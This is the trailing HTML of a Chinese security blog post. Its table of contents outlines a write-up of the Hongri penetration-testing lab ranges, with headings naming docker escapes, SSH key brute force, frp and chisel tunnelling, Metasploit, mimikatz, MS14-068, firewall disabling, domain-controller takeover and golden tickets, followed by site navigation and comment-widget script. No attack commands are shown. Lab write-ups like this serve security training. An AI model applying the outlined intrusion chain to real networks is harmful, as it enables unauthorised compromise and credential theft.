href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">4.1.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">4.1.1.</span> <span class="toc-text">账号密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP"><span class="toc-number">4.1.2.</span> <span class="toc-text">IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFUbuntu%E7%9A%84docker%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.1.3.</span> <span class="toc-text">开启Ubuntu的docker服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E6%89%93-%E5%89%8D%E7%AB%AF"><span class="toc-number">4.2.</span> <span class="toc-text">+开打&#x2F;前端</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B-%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.2.1.</span> <span class="toc-text">主机探测+端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%A8%E4%B8%AA%E7%AB%AF%E5%8F%A3%E7%9C%8B%E7%9C%8B"><span class="toc-number">4.2.2.</span> <span class="toc-text">挨个端口看看</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2001%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">2001是文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2002%E6%98%AFtomcat"><span class="toc-number">4.2.2.2.</span> <span class="toc-text">2002是tomcat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2003%E6%98%AF%E7%9B%B4%E6%8E%A5%E8%BF%9B%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BA%86%EF%BC%8C%E7%94%9A%E8%87%B3%E6%B2%A1%E6%9C%89%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">4.2.2.3.</span> <span class="toc-text">2003是直接进数据库了，甚至没有弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99%E7%A0%81"><span class="toc-number">4.2.2.3.1.</span> <span class="toc-text">写码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%85%A2%E6%97%A5%E5%BF%97%E4%B9%9F%E8%AF%A5%E4%B9%9F%E8%A1%8C%EF%BC%8C%E6%B2%A1%E8%AF%95"><span class="toc-number">4.2.2.3.2.</span> <span class="toc-text">慢日志也该也行，没试</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E9%80%83%E9%80%B8"><span class="toc-number">4.3.</span> <span class="toc-text">++docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E5%AF%86%E9%92%A5%E7%88%86%E7%A0%B4"><span class="toc-number">4.3.1.</span> <span class="toc-text">ssh密钥爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">4.4.</span> <span class="toc-text">+++域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E6%8F%90%E6%9D%83Ubuntu"><span class="toc-number">4.4.1.</span> <span class="toc-text">先提权Ubuntu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-frp%E9%9A%A7%E9%81%93"><span class="toc-number">4.4.2.</span> <span class="toc-text">1+frp隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-1"><span class="toc-number">4.4.3.</span> <span class="toc-text">+msf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%9F%9F"><span class="toc-number">4.4.3.1.</span> <span class="toc-text">打域</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAsocks%E9%9A%A7%E9%81%93"><span class="toc-number">4.4.3.2.</span> <span class="toc-text">创建socks隧道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mimikatz"><span class="toc-number">4.4.3.3.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%8F%90%E6%9D%83MS14-068"><span class="toc-number">4.4.3.4.</span> <span class="toc-text">域提权MS14-068</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%9F%9F%E6%8E%A7"><span class="toc-number">4.4.3.5.</span> <span class="toc-text">打域控</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%E5%85%B3%E5%A2%99"><span class="toc-number">4.4.3.5.1.</span> <span class="toc-text">法一关墙</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%E5%85%B3%E5%A2%99"><span class="toc-number">4.4.3.5.2.</span> <span class="toc-text">法二关墙</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BF%E5%9F%9F%E6%8E%A7shell"><span class="toc-number">4.4.3.6.</span> <span class="toc-text">拿域控shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%93%E6%B3%951"><span class="toc-number">4.4.3.6.1.</span> <span class="toc-text">打法1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%93%E6%B3%952"><span class="toc-number">4.4.3.6.2.</span> <span class="toc-text">打法2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-chisel%E9%9A%A7%E9%81%93"><span class="toc-number">4.4.4.</span> <span class="toc-text">2+chisel隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%BE%91proxychains4-conf%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">4.4.4.1.</span> <span class="toc-text">编辑proxychains4.conf文件：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-1"><span class="toc-number">4.5.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5"><span class="toc-number">5.</span> <span class="toc-text">+红日靶场5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA6"><span class="toc-number">6.</span> <span class="toc-text">+红日靶场6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7"><span class="toc-number">7.</span> <span class="toc-text">+红日靶场7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE-1"><span class="toc-number">7.1.</span> <span class="toc-text">配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E6%89%93-2"><span class="toc-number">7.2.</span> <span class="toc-text">开打</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">7.2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6379%E7%AB%AF%E5%8F%A3-radis"><span class="toc-number">7.2.2.</span> <span class="toc-text">6379端口-radis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93web1"><span class="toc-number">7.2.3.</span> <span class="toc-text">打web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93web2"><span class="toc-number">7.2.4.</span> <span class="toc-text">打web2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8"><span class="toc-number">7.2.4.1.</span> <span class="toc-text">手动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">7.2.4.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#docker%E9%80%83%E9%80%B8-1"><span class="toc-number">7.2.4.3.</span> <span class="toc-text">docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Docker-runC%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="toc-number">7.2.4.3.1.</span> <span class="toc-text">Docker runC漏洞逃逸</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Docker-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8cron"><span class="toc-number">7.2.4.3.2.</span> <span class="toc-text">Docker 特权模式逃逸cron</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#docker%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BDssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">7.2.4.3.3.</span> <span class="toc-text">docker磁盘挂载ssh连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%912%E5%B1%82"><span class="toc-number">7.2.5.</span> <span class="toc-text">内网2层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%9F%9F%E6%8E%A7-1"><span class="toc-number">7.2.6.</span> <span class="toc-text">打域控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-5"><span class="toc-number">7.2.6.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mimikatz-1"><span class="toc-number">7.2.6.2.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0-%E6%89%93%E5%9F%9F%E6%8E%A7"><span class="toc-number">7.2.6.3.</span> <span class="toc-text">路由添加+打域控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0"><span class="toc-number">7.2.6.4.</span> <span class="toc-text">路由添加</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-4"><span class="toc-number">7.2.6.5.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">7.2.7.</span> <span class="toc-text">黄金票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">7.3.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/" title="2025元旦渗透赛复现-ctfshow">2025元旦渗透赛复现-ctfshow</a><time datetime="2025-01-16T08:51:44.000Z" title="Created 2025-01-16 16:51:44">2025-01-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" title="2024第一场ciscn-ctfshow复现">2024第一场ciscn-ctfshow复现</a><time datetime="2025-01-16T08:46:00.000Z" title="Created 2025-01-16 16:46:00">2025-01-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" title="红日靶场12457">红日靶场12457</a><time datetime="2024-12-26T13:22:52.000Z" title="Created 2024-12-26 21:22:52">2024-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/" title="24强网杯">24强网杯</a><time datetime="2024-12-26T13:20:17.000Z" title="Created 2024-12-26 21:20:17">2024-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8ACN-fnst-CTF/" title="第二届CN-fnst::CTF">第二届CN-fnst::CTF</a><time datetime="2024-12-17T07:30:42.000Z" title="Created 2024-12-17 15:30:42">2024-12-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const initValine = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyValine = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const valineConfig = {
      el: '#vcomment',
      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      visitor: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
    }

    new Valine(valineConfig)
  }

  const loadValine = async (el, path) => {
    if (typeof Valine === 'function') {
      initValine(el, path)
    } else {
      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
      initValine(el, path)
    }
  }

  if (isShuoshuo) {
    'Valine' === 'Valine'
      ? window.shuoshuoComment = { loadComment: loadValine }
      : window.loadOtherComment = loadValine
    return
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>